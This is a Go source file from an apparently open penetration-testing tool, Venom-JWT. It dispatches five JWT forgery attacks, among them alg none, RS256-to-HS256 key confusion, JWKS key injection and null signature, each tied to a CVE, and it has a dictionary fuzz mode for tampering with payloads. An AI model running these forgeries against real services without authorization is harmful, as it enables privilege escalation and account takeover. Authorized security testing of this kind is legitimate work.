package service

import (
	"Venom-JWT/model"
	"Venom-JWT/utils"
	"os"
	"strings"

	"github.com/gookit/color"
)

// JwtParseService 解析JWT的各个参数并打印，并且返回JWT对象及第一段和第三段的处理结果
func JwtParseService(jwtStr string) (*model.Jwt, string, string) {
	jwt, err := utils.ParseJWT(jwtStr)
	if err != nil {
		color.Printf("<red>[-]JWT解析错误：%s</>\n", err.Error())
		os.Exit(1)
	}
	// 打印JWT解析结果
	color.Println("<magentaB>[+]</>" + jwt.ToString() + "\n")
	return jwt, utils.GetJwtBodyStr(jwtStr, 1), utils.GetJwtBodyStr(jwtStr, 3)
}

// jwtChangeAllTestDo 执行所有JWT测试模式
func jwtChangeAllTestDo(jwt model.Jwt, firstBodyStr string, thirdBodyStr string, pemPath string) {
	// 第一种情况：修改alg为none (CVE-2015-2951)
	JwtAlgNoneService(jwt)

	// 第二种情况：未验证签名导致的越权
	JwtWithNoCheck(firstBodyStr, jwt.Payload, thirdBodyStr)

	// 第三种情况：将 alg 由 RS256 更改为 HS256 (CVE-2016-10555)
	JwtModifyAsymToSym(jwt, pemPath)

	// 第四种情况：JWKS公钥注入--伪造密钥 (CVE-2018-0114)
	JwtWithFakeKey(jwt.Payload)

	// 第五种情况：空签名 (CVE-2020-28042)
	JwtNullSecret(firstBodyStr, jwt.Payload)
}

// jwtChooseChangeTest 根据指定的攻击类型执行JWT测试
func jwtChooseChangeTest(jwt model.Jwt, firstBodyStr string, thirdBodyStr string, attackType int, pemPath string) {
	switch attackType {
	case model.AttackTypeAlgNone:
		// 第一种情况：修改alg为none (CVE-2015-2951)
		JwtAlgNoneService(jwt)
	case model.AttackTypeNoCheckSignature:
		// 第二种情况：未验证签名导致的越权
		JwtWithNoCheck(firstBodyStr, jwt.Payload, thirdBodyStr)
	case model.AttackTypeAsymToSym:
		// 第三种情况：将 alg 由 RS256 更改为 HS256 (CVE-2016-10555)
		JwtModifyAsymToSym(jwt, pemPath)
	case model.AttackTypeFakeKey:
		// 第四种情况：JWKS公钥注入--伪造密钥 (CVE-2018-0114)
		JwtWithFakeKey(jwt.Payload)
	case model.AttackTypeNullSignature:
		// 第五种情况：空签名 (CVE-2020-28042)
		JwtNullSecret(firstBodyStr, jwt.Payload)
	default:
		// 全执行测试
		jwtChangeAllTestDo(jwt, firstBodyStr, thirdBodyStr, pemPath)
	}
}

// JwtChangeTest 执行JWT越权测试
func JwtChangeTest(jwt model.Jwt, firstBodyStr string, thirdBodyStr string, attackType int, pemPath string) {
	color.Println("<lightRedB>==============没secret修改Payload的越权测试===========</>\n")
	jwtChooseChangeTest(jwt, firstBodyStr, thirdBodyStr, attackType, pemPath)
}

// JwtChangeFuzzTest 使用FUZZ模式执行JWT越权测试
func JwtChangeFuzzTest(jwt model.Jwt, firstBodyStr string, thirdBodyStr string, attackType int, dictArr []string, pemPath string) {
	color.Println("<lightRedB>==============没secret修改Payload的FUZZ越权测试===========</>\n")

	totalTests := len(dictArr)
	color.Printf("<cyan>将使用 %d 个字典值进行测试</>\n", totalTests)

	for i, dictStr := range dictArr {
		color.Printf("\n<yellow>[%d/%d] 测试值: %s</>\n", i+1, totalTests, dictStr)
		// 创建新的JWT对象，替换FUZZ标记
		var copyJwt = model.Jwt{
			RealHeader: jwt.RealHeader,
			Payload:    strings.Replace(jwt.Payload, "FUZZ", dictStr, -1),
			Message:    jwt.Message,
			Signature:  jwt.Signature,
		}
		jwtChooseChangeTest(copyJwt, firstBodyStr, thirdBodyStr, attackType, pemPath)
	}
}
